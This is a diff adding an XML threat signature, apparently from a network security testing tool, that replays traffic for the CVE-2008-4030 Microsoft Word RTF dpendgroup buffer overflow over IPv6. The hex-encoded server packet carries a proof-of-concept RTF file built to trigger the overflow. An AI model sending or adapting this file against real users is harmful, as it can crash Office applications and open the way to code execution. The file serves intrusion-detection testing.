@@ -1,0 +1,105 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Microsoft Word RTF Mismatched dpendgroup Buffer Overflow (IPv6 Version)"/>
+    <EngDesc display="true" value="There exists a buffer overflow vulnerability in Microsoft Word products. The flaw is due to a boundary error when processing RTF documents that contain mismatched dpendgroup control words. A remote attacker can exploit this vulnerability by enticing the target user to open a crafted RTF file. Successful exploitation can lead to arbitrary code execution within the security context of the currently logged on user.            An attack targeting this vulnerability can result in the injection and execution of code. If code execution is successful, the behaviour of the target will depend on the intention of the attacker. Any code injected will be executed within the security context of the currently logged in user.            In the case of an unsuccessful code execution attack, affected product will terminate resulting in the loss of any unsaved data from the current session. (IPv6 Version)"/>
+    <Intent display="true">
+      <item value="BUFFER_OVERFLOW"/>
+    </Intent>
+    <Protocol display="true" value="/IPv6"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Microsoft"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Microsoft_Microsoft_Word"/>
+      <item value="Microsoft_Microsoft_Word_Viewer"/>
+      <item value="Microsoft_Microsoft_Outlook"/>
+      <item value="Microsoft_Microsoft_Office"/>
+      <item value="Microsoft_Microsoft_Office_Compatibility_Pack"/>
+      <item value="Microsoft_Microsoft_Open_XML_File_Format_Converter_for_Mac"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Microsoft_Word_2000"/>
+      <item value="Microsoft_Word_2002"/>
+      <item value="Microsoft_Word_2003"/>
+      <item value="Microsoft_Word_2007"/>
+      <item value="Microsoft_Word_Viewer_2003"/>
+      <item value="Microsoft_Outlook_2007"/>
+      <item value="Microsoft_Office_2000"/>
+      <item value="Microsoft_Office_XP"/>
+      <item value="Microsoft_Office_2003"/>
+      <item value="Microsoft_Office_2007"/>
+      <item value="Microsoft_Office_2004_for_Mac"/>
+      <item value="Microsoft_Office_2008_for_Mac"/>
+      <item value="Microsoft_Office_Compatibility_Pack_2007"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="FSC20081209-18"/>
+    <CVEID display="true" value="CVE-2008-4030"/>
+    <bugtraqID display="true" value="32642"/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="ThreatEx Team"/>
+    <ID display="true" value="bad68610219f5dd813b80b098c0283a5"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="True"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="Medium"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="Partial"/>
+    <IntegImpact display="false" value="Partial"/>
+    <AvailImpact display="false" value="Partial"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value="normal"/>
+    <LastModified display="false" value="1242929780"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value="B"/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value=""/>
+    <Created value="1242921208" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="K"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="L"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv6Address" value="null" index="M"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv6Address" value="null" index="N"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="O"/>
+  </Variables>
+  <Loops>
+    <for index="D">
+      <for index="K"/>
+      <for index="L"/>
+      <for index="M"/>
+      <for index="N"/>
+      <for index="O"/>
+    </for>
+    <for index="F"/>
+  </Loops>
+  <PostScript/>
+  <Output index="D" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="$sourceIP" Destination-Address="$destIP">
+        <TCP srcPort="@random(1026,65535)" destPort="$HTTPdestPort" SeqNumber="EFF2A329" AckNumber="2DE2C672" HeaderLength="08" WindowSize="016D" Checksum="0F6D" UrgentPointer="0000" Options="0101080A21CD6D9202FDB787" Payload="474554202F7E706176656C702F706F632E72746620485454502F312E300D0A557365722D4167656E743A20576765742F312E31302E32202852656420486174206D6F646966696564290D0A4163636570743A202A2F2A0D0A486F73743A20737469636B790D0A436F6E6E656374696F6E3A204B6565702D416C6976650D0A0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IPv6>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="F" Count="">
+      <Ethernet srcMac="" destMac="" pktType="0800">
+        <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="" Destination-Address="">
+          <TCP srcPort="" destPort="" SeqNumber="2DE2C672" AckNumber="EFF2A3A9" HeaderLength="08" WindowSize="0036" Checksum="63F5" UrgentPointer="0000" Options="0101080A02FDB78921CD6D92" Payload="485454502F312E3120323030204F4B0D0A446174653A205765642C2032342044656320323030382030323A34313A323020474D540D0A5365727665723A204170616368652F322E322E33202843656E744F5329205048502F352E312E36206D6F645F707974686F6E2F332E322E3820507974686F6E2F322E342E33206D6F645F7065726C2F322E302E32205065726C2F76352E382E380D0A4C6173742D4D6F6469666965643A205765642C2032342044656320323030382030323A33393A303320474D540D0A455461673A2022363530303833392D3165342D34356563316362383437666330220D0A4163636570742D52616E6765733A2062797465730D0A436F6E74656E742D4C656E6774683A203438340D0A4B6565702D416C6976653A2074696D656F75743D31352C206D61783D3130300D0A436F6E6E656374696F6E3A204B6565702D416C6976650D0A436F6E74656E742D547970653A20746578742F7274660D0A0D0A7B5C727466315C616E73695C616E7369637067313235325C7563315C64656666307B5C696E7372736964323730313939332050726F6F66204F6620436F6E636570740A5C70617220436F70797269676874205C276139204173737572656E742053656375726520546563686E6F6C6F676965732C20612054454C555320636F6D70616E790A5C7061725C646F5C6470656E6467726F75705C6470706F6C79676F6E335C6470706F6C79676F6E335C6470706F6C79676F6E335C6470706F6C79676F6E335C6470706F6C79676F6E335C6470706F6C79676F6E335C6470706F6C79676F6E335C6470706F6C79676F6E335C6470706F6C79676F6E335C6470706F6C79676F6E335C6470706F6C79676F6E335C6470706F6C79676F6E335C6470706F6C79676F6E335C6470706F6C79676F6E335C6470706F6C79676F6E335C6470706F6C79676F6E335C6470706F6C79676F6E335C6470706F6C79676F6E335C6470706F6C79676F6E335C6470706F6C79676F6E335C6470706F6C79676F6E335C6470706F6C79676F6E335C6470706F6C79676F6E335C6470706F6C79676F6E335C6470706F6C79676F6E335C6470706F6C79676F6E335C6470706F6C79676F6E335C6470706F6C79676F6E335C6470706F6C79676F6E335C6470706F6C79676F6E337D7D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IPv6>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
